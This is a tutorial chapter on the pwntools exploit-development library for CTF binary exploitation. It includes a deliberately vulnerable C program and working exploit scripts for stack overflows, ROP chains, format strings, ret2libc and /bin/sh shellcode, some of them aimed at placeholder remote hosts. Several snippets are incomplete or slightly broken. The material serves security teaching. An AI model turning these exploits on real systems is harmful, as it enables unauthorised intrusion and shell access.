# Introduction to pwntools

Pwntools is a CTF framework and exploit development library designed to make writing exploits simple and fast. It's an essential tool for binary exploitation and reverse engineering.

## Installation and Setup

### Installing pwntools

```bash
# Ubuntu/Debian
sudo apt update
sudo apt install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
python3 -m pip install --upgrade pip
python3 -m pip install --upgrade pwntools

# Verify installation
python3 -c "import pwn; print(pwn.__version__)"
```

### Basic Configuration

```python
# ~/.pwntools.conf
[context]
arch = amd64
os = linux
log_level = info

[template]
host = localhost
port = 1337
```

## Core Concepts

### Context Management

```python
#!/usr/bin/env python3
from pwn import *

# Set global context
context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'debug'

# Or use context manager
with context.local(arch='i386'):
    # 32-bit operations here
    shellcode = asm('mov eax, 1')

print(f"Architecture: {context.arch}")
print(f"Endianness: {context.endianness}")
print(f"Word size: {context.word_size}")
```

### Process Interaction

```python
from pwn import *

# Local process
p = process('./vulnerable_program')

# Remote connection
r = remote('target.com', 1337)

# SSH connection
s = ssh('user', 'host', password='pass')
p = s.process('./program')

# Basic I/O
p.sendline(b'Hello, World!')
response = p.recvline()
p.interactive()  # Drop to interactive mode
```

## Basic Exploitation Example

### Vulnerable Program

```c
// vuln.c
#include <stdio.h>
#include <string.h>

void win() {
    printf("You win!\n");
    system("/bin/sh");
}

void vulnerable() {
    char buffer[64];
    printf("Enter input: ");
    gets(buffer);  // Vulnerable function
    printf("You entered: %s\n", buffer);
}

int main() {
    vulnerable();
    return 0;
}
```

**Compilation:**
```bash
# Compile with specific protections disabled
gcc -fno-stack-protector -no-pie -o vuln vuln.c

# Check security features
checksec vuln
```

### Basic Buffer Overflow Exploit

```python
#!/usr/bin/env python3
from pwn import *

# Set up context
context.binary = './vuln'
context.log_level = 'debug'

def exploit():
    # Start the process
    p = process('./vuln')
    
    # Find the win function address
    elf = ELF('./vuln')
    win_addr = elf.symbols['win']
    
    # Create payload
    offset = 72  # Offset to return address
    payload = b'A' * offset
    payload += p64(win_addr)  # Overwrite return address
    
    # Send payload
    p.sendline(payload)
    
    # Get shell
    p.interactive()

if __name__ == '__main__':
    exploit()
```

## Core pwntools Modules

### ELF Module

```python
from pwn import *

# Load binary
elf = ELF('./program')

# Get function addresses
main_addr = elf.symbols['main']
printf_addr = elf.plt['printf']  # PLT entry
printf_got = elf.got['printf']   # GOT entry

# Get section information
text_section = elf.get_section_by_name('.text')
print(f"Text section: {hex(text_section.header.sh_addr)}")

# Find strings
strings = elf.search(b'/bin/sh')
for addr in strings:
    print(f"Found '/bin/sh' at: {hex(addr)}")

# Find gadgets (requires ROPgadget)
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

# Check security features
print(f"NX: {elf.nx}")
print(f"PIE: {elf.pie}")
print(f"Canary: {elf.canary}")
```

### ROP (Return Oriented Programming)

```python
from pwn import *

context.arch = 'amd64'
elf = ELF('./program')
rop = ROP(elf)

# Build ROP chain
rop.call('puts', [elf.got['puts']])
rop.call(elf.symbols['main'])

print(rop.dump())
payload = b'A' * 72 + rop.chain()
```

### Shellcode Generation

```python
from pwn import *

# Generate shellcode for different architectures
context.arch = 'amd64'
shellcode = asm(shellcraft.sh())

# Or manually
shellcode = asm('''
    mov rax, 59        /* sys_execve */
    lea rdi, [rip + binsh]
    xor rsi, rsi
    xor rdx, rdx
    syscall
    
    binsh:
    .ascii "/bin/sh\\x00"
''')

# Alphanumeric shellcode
alpha_shellcode = asm(shellcraft.sh(), arch='i386')
encoded = encode(alpha_shellcode, 'alpha_mixed')
```

### Format String Exploitation

```python
from pwn import *

# Vulnerable program that uses printf(user_input)
p = process('./format_vuln')

# Find format string offset
def find_offset():
    for i in range(1, 20):
        p = process('./format_vuln')
        payload = f"AAAA%{i}$x".encode()
        p.sendline(payload)
        response = p.recvline()
        if b'41414141' in response:
            print(f"Offset found: {i}")
            return i
        p.close()

offset = find_offset()

# Leak stack values
def leak_stack(offset, count=10):
    payload = ""
    for i in range(count):
        payload += f"%{offset + i}$lx "
    
    p.sendline(payload.encode())
    response = p.recvline().decode()
    values = response.split()
    
    for i, val in enumerate(values):
        try:
            addr = int(val, 16)
            print(f"Stack[{offset + i}]: 0x{addr:016x}")
        except ValueError:
            continue

leak_stack(offset)
```

## Advanced Features

### Automatic Exploitation

```python
from pwn import *

# Automatic buffer overflow detection
def auto_exploit():
    elf = ELF('./vuln')
    p = process('./vuln')
    
    # Create cyclic pattern
    pattern = cyclic(200)
    p.sendline(pattern)
    
    # Wait for crash
    p.wait()
    
    # Get core dump info
    core = Coredump('./core')
    offset = cyclic_find(core.read(core.rsp, 4))
    
    print(f"Offset found: {offset}")
    
    # Build exploit
    payload = b'A' * offset
    payload += p64(elf.symbols['win'])
    
    # Test exploit
    p = process('./vuln')
    p.sendline(payload)
    p.interactive()
```

### Remote Exploitation

```python
from pwn import *

def remote_exploit():
    # Connect to remote service
    r = remote('target.example.com', 1337)
    
    # Handle banner/menu
    r.recvuntil(b'Enter choice: ')
    r.sendline(b'1')  # Select vulnerable option
    
    # Send exploit payload
    payload = build_payload()
    r.sendline(payload)
    
    # Get shell
    r.interactive()

def build_payload():
    # Payload construction logic
    offset = 72
    rop_chain = build_rop_chain()
    
    payload = b'A' * offset
    payload += rop_chain
    
    return payload
```

### Template Generation

```python
#!/usr/bin/env python3
# Generated with pwn template
from pwn import *

exe = context.binary = ELF('./challenge')
host = args.HOST or 'localhost'
port = int(args.PORT or 1337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# Exploit code goes here
io = start()

# Example payload
payload = flat({
    72: exe.symbols['win']
})

io.sendline(payload)
io.interactive()
```

## Utility Functions

### Pattern Generation and Analysis

```python
from pwn import *

# Generate cyclic pattern
pattern = cyclic(100)
print(pattern)

# Find offset from crash
crash_value = 0x61616a61  # Example crash value
offset = cyclic_find(crash_value)
print(f"Offset: {offset}")

# De Bruijn sequence for unique patterns
pattern = de_bruijn(4, 100)  # 4-byte alphabet, 100 chars
```

### Payload Construction

```python
from pwn import *

# Flat payload construction
payload = flat([
    b'A' * 64,          # Padding
    0xdeadbeef,          # Return address
    0x41414141,          # RDI
    0x42424242,          # RSI
])

# Fit payload to specific size
payload = fit({
    0: b'start',
    64: p64(0xdeadbeef),
    72: b'end'
}, length=100)

# Pack/unpack integers
packed = p64(0x1122334455667788)
unpacked = u64(packed)
```

### Encoding and Encryption

```python
from pwn import *

# XOR encoding
data = b"secret"
key = b"key"
encoded = xor(data, key)
decoded = xor(encoded, key)

# Base64
import base64
b64_encoded = base64.b64encode(data)
b64_decoded = base64.b64decode(b64_encoded)

# URL encoding
from urllib.parse import quote, unquote
url_encoded = quote(data)
url_decoded = unquote(url_encoded).encode()
```

## Debugging Integration

### GDB Integration

```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

# Attach GDB to running process
p = process('./vuln')
gdb.attach(p, '''
    break main
    break vulnerable
    continue
''')

# Or start with GDB
p = gdb.debug('./vuln', '''
    set disassembly-flavor intel
    break *main+42
    run
''')
```

### Logging and Output

```python
from pwn import *

# Different log levels
context.log_level = 'debug'    # Most verbose
context.log_level = 'info'     # Default
context.log_level = 'warn'     # Warnings only
context.log_level = 'error'    # Errors only

# Custom logging
log.info("Starting exploit")
log.success("Got shell!")
log.warning("Unusual response")
log.error("Exploit failed")

# Progress indicator
p = log.progress("Brute forcing")
for i in range(100):
    p.status(f"Trying {i}")
    time.sleep(0.1)
p.success("Found!")
```

## Common Patterns and Techniques

### Information Leaks

```python
def leak_address(p, format_offset):
    """Leak address using format string"""
    payload = f"%{format_offset}$lx".encode()
    p.sendline(payload)
    response = p.recvline()
    leaked = int(response.strip(), 16)
    return leaked

def leak_canary(p):
    """Leak stack canary"""
    # Send payload that triggers canary check
    payload = b'A' * 264  # Overwrite canary
    p.sendline(payload)
    response = p.recvall()
    
    if b"stack smashing detected" in response:
        log.info("Canary detected")
        # Use format string to leak canary
        return leak_canary_format_string(p)
```

### Return-to-libc

```python
def ret2libc_exploit():
    elf = ELF('./vuln')
    libc = ELF('./libc.so.6')
    p = process('./vuln')
    
    # Leak libc address
    payload1 = flat([
        b'A' * 72,
        elf.plt['puts'],
        elf.symbols['main'],
        elf.got['puts']
    ])
    
    p.sendline(payload1)
    leaked_puts = u64(p.recvline()[:6].ljust(8, b'\x00'))
    libc.address = leaked_puts - libc.symbols['puts']
    
    log.info(f"Libc base: {hex(libc.address)}")
    
    # Execute system("/bin/sh")
    payload2 = flat([
        b'A' * 72,
        libc.symbols['system'],
        libc.search(b'/bin/sh').__next__()
    ])
    
    p.sendline(payload2)
    p.interactive()
```

## Best Practices

### Script Organization

```python
#!/usr/bin/env python3
from pwn import *

# Global settings
context.arch = 'amd64'
context.log_level = 'info'

# Constants
BINARY_PATH = './challenge'
LIBC_PATH = './libc.so.6'

class Exploit:
    def __init__(self, local=True):
        self.local = local
        self.elf = ELF(BINARY_PATH)
        self.libc = ELF(LIBC_PATH) if os.path.exists(LIBC_PATH) else None
        
    def start(self):
        if self.local:
            return process(BINARY_PATH)
        else:
            return remote('target.com', 1337)
    
    def find_offset(self):
        # Implementation here
        pass
    
    def leak_addresses(self, p):
        # Implementation here
        pass
    
    def build_payload(self):
        # Implementation here
        pass
    
    def run(self):
        p = self.start()
        payload = self.build_payload()
        p.sendline(payload)
        p.interactive()

if __name__ == '__main__':
    exploit = Exploit(local=args.LOCAL)
    exploit.run()
```

### Error Handling

```python
def robust_exploit():
    max_attempts = 5
    
    for attempt in range(max_attempts):
        try:
            p = remote('target.com', 1337)
            
            # Send payload
            payload = build_payload()
            p.sendline(payload)
            
            # Check if exploit worked
            response = p.recv(timeout=2)
            if b"shell" in response or b"$" in response:
                log.success("Exploit successful!")
                p.interactive()
                return
                
        except Exception as e:
            log.warning(f"Attempt {attempt + 1} failed: {e}")
            if p:
                p.close()
        
        time.sleep(1)  # Brief delay between attempts
    
    log.error("All attempts failed")
```

## Key Takeaways

!!! important "pwntools Fundamentals"
    - **Context management** is crucial for correct operation
    - **ELF module** provides powerful binary analysis capabilities
    - **Process interaction** enables both local and remote exploitation
    - **ROP chains** can be built automatically or manually
    - **Logging system** helps debug and track exploit progress

!!! tip "Exploitation Workflow"
    - Start with template generation for consistent structure
    - Use cyclic patterns to find buffer overflow offsets
    - Leverage automatic gadget finding for ROP chains
    - Test locally before attempting remote exploitation
    - Implement robust error handling for unreliable connections

!!! warning "Common Issues"
    - Architecture mismatches can cause incorrect addresses
    - Endianness problems with packed integers
    - Timeout issues with slow or unreliable connections
    - Version differences between local and remote libc
    - ASLR affecting address calculations

---

*Next: [Buffer Overflows](02-buffer-overflow.md)*
